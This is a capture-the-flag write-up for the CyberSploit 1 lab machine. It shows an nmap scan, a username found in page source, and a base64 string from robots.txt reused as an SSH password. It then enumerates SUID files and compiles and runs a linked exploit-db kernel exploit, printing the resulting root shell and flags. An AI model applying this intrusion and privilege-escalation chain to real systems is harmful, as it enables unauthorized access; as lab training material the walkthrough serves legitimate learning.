---
title: CyberSploit 1
categories: [Proving Grounds, Play]
tags: [Kernel Exploit, PrivEsc]
image:
  path: /Vulnhub-Files/img/CyberSploit-1/Untitled.png
  alt:  CyberSploit 1 Machine 🖥️
---


## **Description ⤵️**

>
💡 [CyberSploit-1](https://vulnhub.com/entry/cybersploit-1,506/)
<br>
THIS IS A MACHINE FOR COMPLETE BEGINNER , 
<br>
THERE ARE THREE FALGS AVAILABLE IN THIS VM.
<br>
FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER & EXPLOIT-DB.
{: .prompt-info }


### Let’s find the IP Address first >>

```bash
IP : 192.168.195.92
```
{: .nolineno}

## Port Scan Results ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/CyberSploit]
└─$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 192.168.195.92 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 20:36 IST
Nmap scan report for 192.168.195.92
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

---

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/CyberSploit-1/Untitled.png)

After checking the source code I got this →

![Untitled](/Vulnhub-Files/img/CyberSploit-1/Untitled%201.png)

```bash
username:itsskv
```
{: .nolineno}

Now lets check robots.txt file →

![Untitled](/Vulnhub-Files/img/CyberSploit-1/Untitled%202.png)

Now after decoding this base64 encoding I got this →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/CyberSploit]
└─$ echo "Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=" | base64 -d
cybersploit{youtube.com/c/cybersploit}
```
{: .nolineno}

Now lets use this ⬆️ above string to use as a password for ssh login So, lets give it a try at least →

## SHELL ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/CyberSploit]
└─$ ssh itsskv@192.168.195.92                    
The authenticity of host '192.168.195.92 (192.168.195.92)' cant be established.
ECDSA key fingerprint is SHA256:19IzxsJJ/ZH00ix+vmS6+HQqDcXtk9k30aT3K643kSs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.195.92' (ECDSA) to the list of known hosts.
itsskv@192.168.195.92 is password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2017.

itsskv@cybersploit-CTF:~$
```
{: .nolineno}

Now when I am inside the shell lets try different things to get to root →

```bash
itsskv@cybersploit-CTF:~$ cat local.txt 
d19dff81aa1a2e22550afd3b583ea580
itsskv@cybersploit-CTF:~$
itsskv@cybersploit-CTF:~$ cat flag2.txt 
Your flag is in another file...
itsskv@cybersploit-CTF:~$
```
{: .nolineno}

Lets check the SUIDs and GUIDs files →

```bash
itsskv@cybersploit-CTF:/$ find / -perm -u=s -type f 2>/dev/null
/bin/fusermount
/bin/ping
/bin/su
/bin/umount
/bin/mount
/bin/ping6
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/arping
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/lppasswd
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/at
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/pt_chown
itsskv@cybersploit-CTF:/$ find / -perm -g=s -type f 2>/dev/null
/sbin/unix_chkpwd
/usr/bin/mlocate
/usr/bin/X
/usr/bin/crontab
/usr/bin/chage
/usr/bin/dotlockfile
/usr/bin/bsd-write
/usr/bin/ssh-agent
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/mail-touchlock
/usr/bin/expiry
/usr/bin/at
/usr/bin/wall
/usr/sbin/uuidd
/usr/games/gnomine
/usr/games/mahjongg
/usr/lib/libvte-2.90-9/gnome-pty-helper
/usr/lib/utempter/utempter
/usr/lib/evolution/camel-lock-helper-1.2
itsskv@cybersploit-CTF:/$
```
{: .nolineno}

Now after checking so many things lets look for Kernel Exploitation →

```bash
itsskv@cybersploit-CTF:/home/cybersploit$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
itsskv@cybersploit-CTF:/home/cybersploit$
```
{: .nolineno}

After reconing online I got an exploit → [https://www.exploit-db.com/raw/37292](https://www.exploit-db.com/raw/37292)

Lets try it out now →

```bash
itsskv@cybersploit-CTF:/tmp$ nano explit.c
itsskv@cybersploit-CTF:/tmp$ chmod +x explit.c
itsskv@cybersploit-CTF:/tmp$ gcc explit.c -o shell
itsskv@cybersploit-CTF:/tmp$ ./shell
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# /bin/bash -i
root@cybersploit-CTF:/tmp# whoami
root
root@cybersploit-CTF:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
root@cybersploit-CTF:/tmp# cd /root
root@cybersploit-CTF:/root# ls -al
total 136
drwx------ 20 root root  4096 Jun 28 20:24 .
drwxr-xr-x 23 root root  4096 Sep 22  2020 ..
-rw-------  1 root root  3540 Sep 23  2020 .ICEauthority
-rw-------  1 root root     0 Sep 23  2020 .Xauthority
-rw-------  1 root root     0 Sep 23  2020 .bash_history
-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc
drwx------ 13 root root  4096 Sep  3  2020 .cache
drwx------  9 root root  4096 Sep  3  2020 .config
drwx------  3 root root  4096 Jun 27  2020 .dbus
-rw-r--r--  1 root root    25 Sep 23  2020 .dmrc
drwx------  3 root root  4096 Sep 23  2020 .gconf
drwx------  4 root root  4096 Sep  3  2020 .gnome2
-rw-r--r--  1 root root   107 Sep 23  2020 .gtk-bookmarks
drwx------  2 root root  4096 Sep  3  2020 .gvfs
drwxr-xr-x  3 root root  4096 Sep  4  2020 .local
drwx------  3 root root  4096 Sep  3  2020 .mission-control
drwx------  4 root root  4096 Sep  3  2020 .mozilla
-rw-r--r--  1 root root   140 Apr 19  2012 .profile
drwx------  2 root root  4096 Sep 23  2020 .pulse
-rw-------  1 root root   256 Jun 25  2020 .pulse-cookie
-rw-------  1 root root 11459 Sep 23  2020 .xsession-errors
-rw-------  1 root root 11011 Sep 22  2020 .xsession-errors.old
drwxr-xr-x  2 root root  4096 Sep  3  2020 Desktop
drwxr-xr-x  2 root root  4096 Sep  3  2020 Documents
drwxr-xr-x  2 root root  4096 Sep  3  2020 Downloads
drwxr-xr-x  2 root root  4096 Sep  3  2020 Music
drwxr-xr-x  2 root root  4096 Sep  3  2020 Pictures
drwxr-xr-x  2 root root  4096 Sep  3  2020 Public
drwxr-xr-x  2 root root  4096 Sep  3  2020 Templates
drwxr-xr-x  2 root root  4096 Sep  3  2020 Videos
-rw-r--r--  1 root root    32 Sep  4  2020 finalflag.txt
-rw-r--r--  1 root root    33 Jun 28 20:24 proof.txt
root@cybersploit-CTF:/root# cat finalflag.txt 
Your flag is in another file...
root@cybersploit-CTF:/root# cat proof.txt 
59595564ca25b9405d338daab9170f4c
root@cybersploit-CTF:/root# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:50:56:ba:1f:90 brd ff:ff:ff:ff:ff:ff
    inet 192.168.195.92/24 brd 192.168.195.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feba:1f90/64 scope link 
       valid_lft forever preferred_lft forever
root@cybersploit-CTF:/root#
```
{: .nolineno}

---

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }